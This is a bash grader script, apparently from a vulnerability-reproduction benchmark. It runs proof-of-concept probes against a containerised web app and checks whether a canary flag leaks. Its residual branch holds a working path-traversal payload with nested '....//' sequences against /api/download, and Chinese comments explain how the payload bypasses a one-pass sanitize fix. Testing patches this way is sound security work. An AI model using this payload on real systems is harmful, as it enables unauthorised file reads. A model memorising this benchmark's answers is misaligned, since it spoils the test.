#!/usr/bin/env bash
# verify.sh --seed|--residual — 0=效果发生(flag出现) 10=未发生 20=环境失败 30=参数错误
# seed 路径：poc/seed_exec.py <candidate.json> <version>（公开执行器）；residual 需 case 补实现。
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR"
if [[ -f "$WORK_DIR/compose.env" ]]; then
  set -a
  # shellcheck disable=SC1091
  source "$WORK_DIR/compose.env"
  set +a
fi
SVC="$VERSION"
case "$VERSION" in
  v0) PORT="${PORT_V0_0:-}" ;;
  v1) PORT="${PORT_V1_0:-}" ;;
  *) PORT="${PORT_V2_0:-}" ;;
esac
if [[ -z "$PORT" ]]; then
  PORT="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" port "$SVC" 1881 2>/dev/null | sed 's/.*://' | tr -d '[:space:]' || true)"
fi
export PCB_TARGET_PORT="${PORT:-}"
if [[ "$MODE" == "--seed" ]]; then
  CAND="$("$PY" "$CASE_DIR/poc/original_poc.py" "$VERSION" 2>/dev/null || "$PY" "$CASE_DIR/poc/original_poc.py" 2>/dev/null)"
  CAND="${CAND:-"{}"}"
  # 容错：非 JSON 输出（如纯路径字符串）包装成 {"path": ...}
  CAND="$("$PY" -c "import json,sys
s = sys.argv[1]
try:
    json.loads(s)
    print(s)
except Exception:
    print(json.dumps({'path': s.strip(), 'to': s.strip(), 'payload': s.strip(), 'css': s.strip()}))" "$CAND")"
  printf '%s' "$CAND" > "$WORK_DIR/cand.json"
  export PYTHONPATH="$CASE_DIR${PYTHONPATH:+:$PYTHONPATH}"  # poc_common importable
OUT="$("$PY" "$CASE_DIR/poc/seed_exec.py" "$WORK_DIR/cand.json" "$VERSION" 2>&1)" || { echo "$OUT" >&2; exit 20; }
else
  # residual（CVE-2026-25951，_heldout/bypass_poc.py 语义内嵌，不引用 hidden 文件）：
  # 嵌套序列 ....// 绕过单遍 sanitize。V1(1.2.10) 的 CVE-2023-31718 修复是单遍
  # `req.query.name.replace(/..\//g,'')`：对 "....//" 只处理内层 ".."+"/"，一次替换后
  # 剩余 ".." + 尾部 "/" 重组为合法 "../" -> 仍穿越出 reportsDir 读到 /canary.txt
  # （同 sink /api/download；V2 1.2.11 的 resolveWithin 把 "...." 当字面目录名、拒绝 ".." 段）。
  # canary 类：/canary.txt 由 entrypoint 在启动时以 ${PCB_FLAG}(=RUN_FLAG) 种入，
  # 判定基准 = RUN_FLAG（提交值）。走公开执行器 poc/seed_exec.py（BASE 已被 PCB_TARGET_PORT 覆盖）。
  printf '%s' '{"probe_id": "cve-2026-25951-nested-dotdot", "method": "GET", "endpoint": "/api/download", "query": {"cmd": "REPORT-DOWNLOAD", "name": "....//....//....//....//....//....//....//....//....//....//canary.txt"}}' > "$WORK_DIR/cand.json"
  OUT="$("$PY" "$CASE_DIR/poc/seed_exec.py" "$WORK_DIR/cand.json" "$VERSION" 2>&1)" || { echo "$OUT" >&2; exit 20; }
  echo "${OUT:0:500}"
  if grep -qF "$RUN_FLAG" <<<"$OUT"; then exit 0; else exit 10; fi
fi
BODY="$(printf '%s' "$OUT" | "$PY" -c "import json,sys
try:
    d = json.load(sys.stdin)
    print(d.get('body') or d.get('fetched_body') or json.dumps(d, ensure_ascii=False))
except Exception:
    print('')" 2>/dev/null)"
echo "${BODY:0:500}"
if grep -q "$RUN_FLAG" <<<"$BODY"; then exit 0; else exit 10; fi
